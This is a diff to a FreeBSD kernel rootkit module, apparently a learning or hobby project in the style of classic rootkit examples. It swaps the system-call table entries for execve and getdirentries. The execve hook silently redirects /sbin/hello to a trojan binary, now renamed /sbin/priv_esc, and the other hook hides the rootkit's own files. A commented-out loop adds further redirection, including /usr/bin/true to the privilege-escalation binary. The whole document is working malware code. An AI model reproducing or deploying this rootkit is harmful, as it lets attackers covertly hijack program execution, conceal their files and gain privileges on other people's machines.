@@ -15,11 +15,18 @@
 #include <sys/dirent.h>
 
 #define ORIGINAL	"/sbin/hello"
-#define TROJAN		"/sbin/trojan_hello"
+#define TROJAN		"/sbin/priv_esc"
 
 static int activated = 0;
-char *T_NAME[] = {"rootkit.ko", "trojan_hello"};
+
+char *T_NAME[] = {"rootkit.ko", "trojan_hello", "controller", "priv_esc"};
 static int t_name_len = sizeof(T_NAME)/sizeof(T_NAME[0]);
+
+char* redir_pair[][2] = {
+	{"/sbin/hello", "/sbin/trojan_hello"},
+	{"/usr/bin/true", "/sbin/priv_esc"} 
+};
+static int redir_pair_len = sizeof(redir_pair)/sizeof(redir_pair[0]);
 
 static int execve_hook(struct thread *td, void *syscall_args)
 {
@@ -31,14 +38,38 @@ static int execve_hook(struct thread *td, void *syscall_args)
 	struct vmspace *vm;
 	vm_offset_t base, addr;
 	char t_fname[] = TROJAN;
+	/*
+	for (int i=0; i<redir_pair_len; i++) {
+		if (strcmp(uap->fname, redir_pair[i][0]) == 0) {
+			char *t_fname = redir_pair[i][1];
+			uprintf("%d. %s\n", i, t_fname);
+			vm = curthread->td_proc->p_vmspace;
+			base = round_page((vm_offset_t) vm->vm_daddr);
+			addr = base + ctob(vm->vm_dsize);
 
+			vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE, 0,
+		    	VM_PROT_ALL, VM_PROT_ALL, 0);
+			vm->vm_dsize += btoc(PAGE_SIZE);
+
+			copyout(&t_fname, (char *)addr, strlen(t_fname));
+			kernel_ea.fname = (char *)addr;
+			kernel_ea.argv = uap->argv;
+			kernel_ea.envv = uap->envv;
+
+			user_ea = (struct execve_args *)addr + sizeof(t_fname);
+			copyout(&kernel_ea, user_ea, sizeof(struct execve_args));
+
+			return(sys_execve(curthread, user_ea));
+		}
+	}
+	*/
 	if (strcmp(uap->fname, ORIGINAL) == 0) {
 		vm = curthread->td_proc->p_vmspace;
 		base = round_page((vm_offset_t) vm->vm_daddr);
 		addr = base + ctob(vm->vm_dsize);
 
 		vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE, 0,
-		    VM_PROT_ALL, VM_PROT_ALL, 0);
+		   	VM_PROT_ALL, VM_PROT_ALL, 0);
 		vm->vm_dsize += btoc(PAGE_SIZE);
 
 		copyout(&t_fname, (char *)addr, strlen(t_fname));
@@ -51,7 +82,6 @@ static int execve_hook(struct thread *td, void *syscall_args)
 
 		return(sys_execve(curthread, user_ea));
 	}
-
 	return(sys_execve(td, syscall_args));
 }
 
@@ -107,6 +137,7 @@ static int control(struct thread *td, void *arg) {
 	struct control_arg *uap;
 	uap = (struct control_arg *)arg;
 	if (strcmp(uap->option, "on") == 0 && activated == 0) {
+		uprintf("Pair size: %d\n", redir_pair_len);
 		sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
 		activated = 1;
